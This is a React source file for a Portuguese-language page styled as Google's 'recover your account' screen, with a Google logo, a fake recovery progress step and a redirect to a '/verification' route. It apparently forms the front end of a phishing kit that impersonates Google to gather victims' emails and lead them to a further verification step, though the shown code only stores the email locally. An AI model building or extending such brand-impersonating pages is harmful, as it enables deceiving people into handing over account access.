
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import GoogleLogo from '../components/GoogleLogo';
import RecoveryCard from '../components/RecoveryCard';
import Spinner from '../components/Spinner';
import RecoveryProcess from '../components/RecoveryProcess';
import { toast } from '@/hooks/use-toast';

const Index = () => {
  const [email, setEmail] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showRecoveryProcess, setShowRecoveryProcess] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!email || !email.includes('@')) {
      setError('Digite um endereço de e-mail válido');
      return;
    }
    
    setError('');
    setLoading(true);
    
    // Short delay before showing recovery process
    setTimeout(() => {
      setLoading(false);
      setShowRecoveryProcess(true);
      localStorage.setItem('recovery_email', email);
    }, 1000);
  };

  const handleRecoveryComplete = () => {
    navigate('/verification');
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 px-4 py-12">
      <div className="mb-8 animate-fade-in">
        <GoogleLogo />
      </div>
      
      <RecoveryCard>
        {!showRecoveryProcess ? (
          <>
            <h1 className="text-2xl font-medium text-gray-900 mb-2 animate-slide-up">Recuperar sua conta Google</h1>
            <p className="text-gray-600 mb-8 animate-slide-up delay-100">
              Digite seu endereço de e-mail para continuar
            </p>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="animate-slide-up delay-200">
                <input 
                  type="email" 
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="input-field"
                  placeholder="Endereço de e-mail"
                  autoFocus
                />
                {error && <p className="text-red-500 text-sm mt-1">{error}</p>}
                <p className="text-sm text-gray-500 mt-2">
                  Não é seu computador? Use o modo privado para fazer login de forma privada.
                  <a href="#" className="text-google-blue ml-1 hover:underline">Saiba mais</a>
                </p>
              </div>
              
              <div className="flex justify-between items-center pt-4 animate-slide-up delay-300">
                <button 
                  type="button" 
                  className="text-google-blue font-medium hover:text-blue-700 transition-colors"
                  onClick={() => toast({
                    title: "Informação",
                    description: "Criação de conta não disponível neste momento."
                  })}
                >
                  Criar conta
                </button>
                
                <button 
                  type="submit" 
                  className="blue-button flex items-center justify-center min-w-[90px] h-10"
                  disabled={loading}
                >
                  {loading ? <Spinner /> : 'Próxima'}
                </button>
              </div>
            </form>
          </>
        ) : (
          <div className="py-4">
            <h1 className="text-2xl font-medium text-gray-900 mb-2 animate-slide-up">Recuperando sua conta</h1>
            <p className="text-gray-600 mb-8 animate-slide-up delay-100">
              Por favor, aguarde enquanto processamos sua solicitação
            </p>
            <RecoveryProcess onComplete={handleRecoveryComplete} />
          </div>
        )}
      </RecoveryCard>
      
      <div className="mt-8 flex flex-col sm:flex-row items-center justify-center text-sm text-gray-500 space-y-2 sm:space-y-0 sm:space-x-8 animate-fade-in">
        <select className="bg-transparent border-none cursor-pointer focus:outline-none">
          <option>Português (Brasil)</option>
          <option>English (United States)</option>
          <option>Español (España)</option>
        </select>
        <div className="flex space-x-8">
          <a href="#" className="hover:text-gray-700">Ajuda</a>
          <a href="#" className="hover:text-gray-700">Privacidade</a>
          <a href="#" className="hover:text-gray-700">Termos</a>
        </div>
      </div>
    </div>
  );
};

export default Index;
